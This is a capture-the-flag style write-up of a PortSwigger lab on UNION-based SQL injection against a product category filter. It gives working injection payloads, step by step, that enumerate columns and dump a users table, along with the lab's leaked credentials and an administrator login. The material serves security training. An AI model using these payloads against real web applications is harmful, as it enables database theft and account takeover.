# PortSwigger — SQL Injection UNION Attack, Retrieving Data from Other Tables

`Web Security Academy` • `SQL Injection` • `Practitioner`

## TL;DR

A product category filter is vulnerable to UNION-based SQL injection. The query returns 2 string-compatible columns. The database contains a `users` table with `username` and `password` columns. A single UNION payload dumps all credentials, revealing the administrator password.

**Lab URL:** `https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables`

---

## Challenge Description

> This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
>
> The database contains a different table called `users`, with columns called `username` and `password`.
>
> To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.

**Context:**
- Difficulty: **Practitioner**
- Category: **SQL Injection — UNION Attacks**
- Goal: Dump the `users` table and authenticate as `administrator`

---

## Recon

### Step 1 — Identify the injection point

The application exposes a `category` GET parameter:

```
https://<lab-id>.web-security-academy.net/filter?category=Accessories
```

Appending `'` triggers a **500 Internal Server Error** — the parameter is injectable.

### Step 2 — Determine column count

Unlike the previous labs, the product listing here renders **name** and **description** — two columns. Confirmed with:

```
/filter?category=Accessories' UNION SELECT NULL,NULL--
```

**Response: 200 OK** → **2 columns** ✅

### Step 3 — Confirm string-compatible columns

Both columns display text content (product name and description), meaning **both columns accept string data** ✅

---

## Exploitation

### Step 4 — Dump the users table

The table name and column names are explicitly given in the lab description: `users`, `username`, `password`. With 2 string-compatible columns, both values can be retrieved directly in a single payload:

```
/filter?category=Accessories' UNION SELECT username,password FROM users--
```

The injected query becomes:

```sql
SELECT name, description FROM products WHERE category = ''
UNION SELECT username, password FROM users--'
```

**Response — all credentials returned in the page:**

```
carlos      evjmy4tvo1jhp8cs5rte
administrator   pm97zra04q6z7qcrwap9
wiener      6uaiaj285d3zjy0125i5
```

### Step 5 — Authenticate as administrator

Navigating to `/login`:
- **Username:** `administrator`
- **Password:** `pm97zra04q6z7qcrwap9`

```
✅ Congratulations, you solved the lab!
```

---

## Attack Chain Summary

```
/filter?category=Accessories' → 500 error → injection confirmed
        ↓
' UNION SELECT NULL,NULL-- → 200 OK → 2 columns confirmed
        ↓
Both columns render text → both are string-compatible ✅
        ↓
' UNION SELECT username,password FROM users--
→ full credential dump:
  administrator:pm97zra04q6z7qcrwap9
  carlos:evjmy4tvo1jhp8cs5rte
  wiener:6uaiaj285d3zjy0125i5
        ↓
Login as administrator → LAB SOLVED ✅
```

---

## Key Takeaways

- This lab combines the two previous techniques: **column count enumeration** + **string-compatible column identification** → direct data extraction
- When the table and column names are known, a single UNION payload is enough to dump the entire table
- Both columns being string-compatible means no concatenation trick is needed — `username` and `password` map cleanly to column 1 and column 2
- Passwords are stored in **plaintext** — combined with SQLi this results in an instant, complete credential breach

---

## References

- [PortSwigger — SQL Injection UNION Attacks](https://portswigger.net/web-security/sql-injection/union-attacks)
- [OWASP — SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [CWE-312: Cleartext Storage of Sensitive Information](https://cwe.mitre.org/data/definitions/312.html)